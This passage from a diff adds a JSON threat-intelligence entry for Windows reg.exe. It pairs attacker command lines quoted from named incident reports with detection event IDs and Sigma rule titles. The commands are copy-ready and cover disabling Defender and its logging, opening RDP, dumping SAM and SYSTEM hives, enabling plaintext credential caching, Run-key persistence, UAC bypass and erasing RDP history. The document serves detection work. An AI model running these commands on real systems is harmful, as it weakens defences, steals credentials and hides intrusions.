+        "sources": "TrendMicro Ursnif Mar 2015 https://web.archive.org/web/20210719165945/https://www.trendmicro.com/en_us/research/15/c/ursnif-the-multifaceted-malware.html?_ga=2.165628854.808042651.1508120821-744063452.1505819992; TrendMicro BKDR_URSNIF.SM https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/BKDR_URSNIF.SM?_ga=2.129468940.1462021705.1559742358-1202584019.1549394279"
+      },
+      {
+        "name": "Zebrocy",
+        "attack_id": "S0251",
+        "evidence": "names reg.exe",
+        "description": "Zebrocy executes the reg query command to obtain information in the Registry.",
+        "sources": "ESET Zebrocy May 2019 https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f",
+        "intent": "Disable Windows Defender: one of the registry commands in the fed scripts the actors ran for this.",
+        "status": "verified",
+        "source_name": "The DFIR Report IcedID to XingLocker October 2021",
+        "source_url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
+      },
+      {
+        "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f",
+        "intent": "One of the registry commands DEV-0832 used to try to turn off Microsoft Defender Antivirus (Figure 3 of the report).",
+        "status": "verified",
+        "source_name": "Microsoft DEV-0832 Vice Society Ransomware Campaigns October 2022",
+        "source_url": "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/"
+      },
+      {
+        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+        "intent": "Disable Windows Defender logging: follows the comment \"rem 0 - Disable Logging\" in the fed2.bat script.",
+        "status": "verified",
+        "source_name": "The DFIR Report IcedID to XingLocker October 2021",
+        "source_url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
+      },
+      {
+        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+        "intent": "Disable Windows Defender logging: follows the comment \"rem 0 - Disable Logging\" in the fed2.bat script.",
+        "status": "verified",
+        "source_name": "The DFIR Report IcedID to XingLocker October 2021",
+        "source_url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f",
+        "intent": "Open port 3389 for Remote Desktop in the firewall policy. Part of enu.cmd, which the report says also created an administrator account and disabled the host-based firewall.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f",
+        "intent": "Open port 3389 for Remote Desktop in the firewall policy. Part of enu.cmd, which the report says also created an administrator account and disabled the host-based firewall.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v MaxInstanceCount /t REG_DWORD /d 100 /f",
+        "intent": "Part of enu.cmd, which the report says created an administrator account, disabled the host-based firewall and opened port 3389 for RDP. The report does not explain this line on its own.",
+        "status": "verified",
+        "source_name": "CISA TA18-074A Russian Government Cyber Activity March 2018",
+        "source_url": "https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors"
+      },
+      {
+        "command": "/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions",
+        "intent": "Discovery: list the user's saved PuTTY sessions to find remote systems for further lateral movement.",
+        "status": "verified",
+        "source_name": "FoxIT Wocao December 2019",
+        "source_url": "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f",
+        "intent": "Enable Remote Assistance on the host, one of the registry changes BianLian made.",
+        "status": "verified",
+        "source_name": "CISA AA23-136A BianLian Ransomware Group May 2023",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a"
+      },
+      {
+        "command": "reg save hklm\\sam C:\\ProgramData\\sam.save",
+        "intent": "A batch file ran reg save on the SAM hive, and the saved hives were then compressed into a ZIP file.",
+        "status": "verified",
+        "source_name": "Volexity Nearest Neighbor Attack November 2024",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "command": "reg save hklm\\system C:\\ProgramData\\system.save",
+        "intent": "A batch file ran reg save on the SYSTEM hive, and the saved hives were then compressed into a ZIP file.",
+        "status": "verified",
+        "source_name": "Volexity Nearest Neighbor Attack November 2024",
+        "source_url": "https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "command": "reg.exe save HKLM\\SYSTEM “C:\\Windows\\temp\\1\\sy.sa” /y",
+        "intent": "The threat actor used reg.exe to dump the SYSTEM registry hive to gain access to local user credentials.",
+        "status": "verified",
+        "source_name": "Fortinet TeamCity Intrusion Saga APT29 Suspected December 2023",
+        "source_url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793"
+      },
+      {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\tapisrv\\Parameters /v ServiceDll /t REG_EXPAND_SZ /d c:\\windows\\tapisrv.dll /f",
+        "intent": "Lotus Blossom used this command line to install the Sagerunex backdoor in the registry, configuring it to run as a service.",
+        "status": "verified",
+        "source_name": "Cisco Talos Lotus Blossom Espionage Group February 2025",
+        "source_url": "https://blog.talosintelligence.com/lotus-blossom-espionage-group/"
+      },
+      {
+        "command": "cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v CurlUpdate /f /d rundll32.exe C:\\Users\\Public\\libcurl.dll,#52",
+        "intent": "The macro set up a Registry Run key as the persistence mechanism for the Libcurl.dll malware loader.",
+        "status": "verified",
+        "source_name": "Proofpoint LookBack Malware Targets US Utilities Sector August 2019",
+        "source_url": "https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks"
+      },
+      {
+        "command": "REG ADD \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d [path to wsslc.exe]",
+        "intent": "The Trojan created persistence by writing this command to r.bat and executing it.",
+        "status": "verified",
+        "source_name": "Unit 42 Sofacy Cannon Trojan November 2018",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2018/11/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/"
+      },
+      {
+        "command": "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"",
+        "intent": "BabyShark issued a sequence of Windows commands, including this query, and saved the results to a log that was then uploaded to the C2.",
+        "status": "verified",
+        "source_name": "Unit 42 BabyShark Malware Targets US National Security Think Tanks February 2019",
+        "source_url": "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"
+      },
+      {
+        "command": "reg export hklm\\sam c:\\sam.reg",
+        "intent": "The hijack command scheduled a task to run a batch file with this command, to hijack a user account with a known password.",
+        "status": "verified",
+        "source_name": "Proofpoint ServHelper and FlawedGrace TA505 January 2019",
+        "source_url": "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+      },
+      {
+        "command": "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \\\"microsoft update\\\" /t REG_SZ /F /D \"SCHTASKS /run /tn 9T6ukfi6\"",
+        "intent": "Persistence was set up on the beachhead host with scheduled tasks and this Run key.",
+        "status": "verified",
+        "source_name": "The DFIR Report Ryuk Speed Run 2 Hours to Ransom November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Parameters /v MaxMpxCt /d 65535 /t REG_DWORD /f",
+        "intent": "BlackCat modifies the MaxMpxCt registry setting to increase the number of outstanding requests allowed, for example SMB requests when distributing ransomware via PsExec.",
+        "status": "verified",
+        "source_name": "Microsoft Many Lives of BlackCat Ransomware June 2022",
+        "source_url": "https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/"
+      },
+      {
+        "command": "REG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f",
+        "intent": "Commands were executed to enable the RDP service on various hosts; this one increases the number of RDP connections allowed to an arbitrarily large number.",
+        "status": "verified",
+        "source_name": "The DFIR Report Qbot and Zerologon Lead to Full Domain Compromise February 2022",
+        "source_url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
+      },
+      {
+        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f",
+        "intent": "The setup.bat script run by the threat actors on servers enabled BitLocker and RDP before encrypting the system drives.",
+        "status": "verified",
+        "source_name": "The DFIR Report Exchange Exploit Leads to Domain Wide Ransomware November 2021",
+        "source_url": "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "REG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f",
+        "intent": "The setup.bat script run by the threat actors on servers enabled BitLocker (and RDP) to encrypt the systems.",
+        "status": "verified",
+        "source_name": "The DFIR Report Exchange Exploit Leads to Domain Wide Ransomware November 2021",
+        "source_url": "https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/"
+      },
+      {
+        "command": "c:\\windows\\system32\\cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Amdesk /t REG_SZ /d \"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \"C:\\Users\\Public\\Libraries\\active_desktop\\desktop_launcher.exe\"\" /f",
+        "intent": "The stager creates persistence for itself across reboots via the registry Run key using this command.",
+        "status": "verified",
+        "source_name": "Cisco Talos Mustang Panda Targets Europe May 2022",
+        "source_url": "https://blog.talosintelligence.com/mustang-panda-targets-europe/"
+      },
+      {
+        "command": "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lsm /t reg_sz /d \"%appdata%\\lsm.exe\" /f",
+        "intent": "The pisloader dropper builds this string and uses it to set the Run registry key before writing and executing lsm.exe.",
+        "status": "verified",
+        "source_name": "Unit 42 Wekby pisloader DNS Command and Control May 2016",
+        "source_url": "https://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/"
+      },
+      {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1",
+        "intent": "The !light.bat file in the credential-theft toolset sets UseLogonCredential to 1 so Windows keeps plaintext logon credentials in memory for Mimikatz.",
+        "status": "verified",
+        "source_name": "Cisco Talos Qilin Attack Methods October 2025",
+        "source_url": "https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "command": "cmd /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f",
+        "intent": "BlackByte ran this among the commands that modify the registry to facilitate elevated execution on the device.",
+        "status": "verified",
+        "source_name": "Microsoft Five Day Job BlackByte Ransomware Intrusion July 2023",
+        "source_url": "https://www.microsoft.com/en-us/security/blog/2023/07/06/the-five-day-job-a-blackbyte-ransomware-intrusion-case-study/"
+      },
+      {
+        "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f",
+        "intent": "Example of UNC1549 commands to delete RDP connection history registry keys, as part of deleting forensic artifacts.",
+        "status": "verified",
+        "source_name": "Google Cloud UNC1549 Aerospace and Defense TTPs November 2025",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"
+      },
+      {
+        "command": "reg save HKLM\\SAM C:\\perflogs \\sam.save",
+        "intent": "The threat actors tried to copy the SAM database from the registry using the reg save command.",
+        "status": "verified",
+        "source_name": "Group-IB APT41 World Tour August 2022",
+        "source_url": "https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
+        "command": "reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "intent": "The attackers ran these reg.exe commands to modify system configuration to enable Terminal Services (RDP) on the computer.",
+        "status": "verified",
+        "source_name": "Symantec Crambus Espionage Middle East Government February 2023",
+        "source_url": "https://www.security.com/threat-intelligence/crambus-middle-east-government"
+      },
+      {
+        "command": "cmd.exe /c reg delete \"HKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Resiliency\" /F",
+        "intent": "Shellcode in the weaponised RTF dropped svchost.exe and then tried to disable Word's recovery features with this command.",
+        "status": "verified",
+        "source_name": "Forcepoint MONSOON Analysis of an APT Campaign May 2016",
+        "source_url": "https://www.forcepoint.com/sites/default/files/resources/files/forcepoint-security-labs-monsoon-analysis-report.pdf"
+      },
+      {
+        "command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d %tmp%\\sick.exe /f",
+        "intent": "The macro's shell command added this registry entry so the downloaded Fareit sample runs when an .msc file is opened, to bypass UAC.",
+        "status": "verified",
+        "source_name": "Fortinet Malicious Macro Bypasses UAC for Fareit December 2016",
+        "source_url": "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware"
+      },
+      {
+        "command": "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v BGClient /t REG_SZ /d \"c:\\Users\\Public\\Music\\VSTOInstaller.exe\" /F",
+        "intent": "Persistence was set up via svmetrics.exe for a few tools using this command.",
+        "status": "verified",
+        "source_name": "Bitdefender LuminousMoth PlugX Persistence Revisited July 2021",
+        "source_url": "https://www.bitdefender.com/blog/labs/luminousmoth-plugx-file-exfiltration-and-persistence-revisited"
+      },
+      {
+        "command": "reg add 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wercplsupport\\Parameters' /f /v ServiceDll /t REG_EXPAND_SZ /d 'c:\\windows\\System32\\wercplsupporte.dll'",
+        "intent": "The actor modified the existing wercplsupport service to use the miner DLL instead of the legitimate one.",
+        "status": "verified",
+        "source_name": "Red Canary Blue Mockingbird Cryptominer May 2020",
+        "source_url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save hklm\\sam c:\\ProgramData\\sam.save\" /f",
+        "intent": "Threat actors dumped the SAM, SECURITY and SYSTEM registry hives using the batch script fodhelper_reg_hashes.bat, which uses fodhelper.",
+        "status": "verified",
+        "source_name": "The DFIR Report Diavol Ransomware December 2021",
+        "source_url": "https://thedfirreport.com/2021/12/13/diavol-ransomware/"
+      },
+      {
+        "command": "cmd.exe /C reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f",
+        "intent": "Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.",
+        "status": "verified",
+        "source_name": "The DFIR Report Conti Ransomware May 2021",
+        "source_url": "https://thedfirreport.com/2021/05/12/conti-ransomware/"
+      },
+      {
+        "command": "cmd /C > C:\\ProgramData\\1.txt 2>&1 reg query HKEY_USERS\\\\<SID>\\Network",
+        "intent": "The attackers examined the registry of the local host and saved a list of all mapped shares in a text file called 1.txt.",
+        "status": "verified",
+        "source_name": "The DFIR Report A Truly Graceful Wipe Out June 2023",
+        "source_url": "https://thedfirreport.com/2023/06/12/a-truly-graceful-wipe-out/"
+      },
+      {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f",
+        "intent": "The attackers force the system to cache credentials so that they can be harvested afterward.",
+        "status": "verified",
+        "source_name": "Cisco Talos Lazarus and the Tale of Three RATs September 2022",
+        "source_url": "https://blog.talosintelligence.com/lazarus-three-rats/"
+      },
+      {
+        "command": "cmd.exe /u /c reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f",
+        "intent": "Listed by the report as a system configuration command (disable UAC) among the configuration changes made on the victim host.",
+        "status": "verified",
+        "source_name": "Cisco Talos Lazarus and the Tale of Three RATs September 2022",
+        "source_url": "https://blog.talosintelligence.com/lazarus-three-rats/"
+      },
+      {
+        "command": "reg.exe add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp /v PortNumber /t REG_DWORD /d 3389 /f",
+        "intent": "Listed by the report as a command to configure RDP.",
+        "status": "verified",
+        "source_name": "Cisco Talos Lazarus and the Tale of Three RATs September 2022",
+        "source_url": "https://blog.talosintelligence.com/lazarus-three-rats/"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4103,
+        "data_components": "Command Execution",
+        "techniques": "T1012"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4104,
+        "data_components": "Command Execution",
+        "techniques": "T1012"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4105,
+        "data_components": "Command Execution",
+        "techniques": "T1012"
+      },
+      {
+        "log": "WinEventLog:PowerShell",
+        "event_id": 4106,
+        "data_components": "Command Execution",
+        "techniques": "T1012"
+      },
+      {
+        "log": "WinEventLog:Security",
+        "event_id": 4688,
+        "data_components": "Process Creation",
+        "techniques": "T1003.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1112, T1012, T1552.002, T1564.004"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 2,
+        "data_components": "File Modification",
+        "techniques": "T1003.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 11,
+        "data_components": "File Creation",
+        "techniques": "T1003.002, T1564.004"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 13,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1112, T1012, T1552.002, T1003.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 14,
+        "data_components": "Windows Registry Key Modification",
+        "techniques": "T1112, T1012, T1552.002, T1003.002"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 15,
+        "data_components": "File Metadata",
+        "techniques": "T1564.004"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "System Information Discovery via Registry Queries",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_discovery_via_reg_queries.yml"
+      },
+      {
+        "title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml"
+      },
+      {
+        "title": "Add SafeBoot Keys Via Reg Utility",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_add_safeboot.yml"
+      },
+      {
+        "title": "Suspicious Reg Add BitLocker",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml"
+      },
+      {
+        "title": "Dropping Of Password Filter DLL",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_credential_access_via_password_filter.yml"
+      },
+      {
+        "title": "Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml"
+      },
+      {
+        "title": "RunMRU Registry Key Deletion",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_delete_runmru.yml"
+      },
+      {
+        "title": "SafeBoot Registry Key Deleted Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_delete_safeboot.yml"
+      },
+      {
+        "title": "Service Registry Key Deleted Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_delete_services.yml"
+      },
+      {
+        "title": "Potentially Suspicious Desktop Background Change Using Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_desktop_background_change.yml"
+      },
+      {
+        "title": "Direct Autorun Keys Modification",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml"
+      },
+      {
+        "title": "Disabling Windows Defender WMI Autologger Session via Reg.exe",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_disable_defender_wmi_autologger.yml"
+      },
+      {
+        "title": "Security Service Disabled Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_disable_sec_services.yml"
+      },
+      {
+        "title": "Dumping of Sensitive Hives Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml"
+      },
+      {
+        "title": "Windows Recall Feature Enabled Via Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_enable_windows_recall.yml"
+      },
+      {
+        "title": "Enumeration for Credentials in Registry",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_enumeration_for_credentials_in_registry.yml"
+      },
+      {
+        "title": "Potential Suspicious Registry File Imported Via Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_import_from_suspicious_paths.yml"
+      },
+      {
+        "title": "Suspicious Query of MachineGUID",
+        "level": "low",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_machineguid.yml"
+      },
+      {
+        "title": "Modify Group Policy Settings",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_modify_group_policy_settings.yml"
+      },
+      {
+        "title": "Potential Configuration And Service Reconnaissance Via Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_query_registry.yml"
+      },
+      {
+        "title": "Potential Tampering With RDP Related Registry Keys Via Reg.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_rdp_keys_tamper.yml"
+      },
+      {
+        "title": "Suspicious ScreenSave Change by Reg.exe",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_screensaver.yml"
+      },
+      {
+        "title": "Changing Existing Service ImagePath Value Via Reg.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_reg_service_imagepath_change.yml"
+      },
+      {
+        "title": "Detected Windows Software Discovery",
+        "level": "medium",
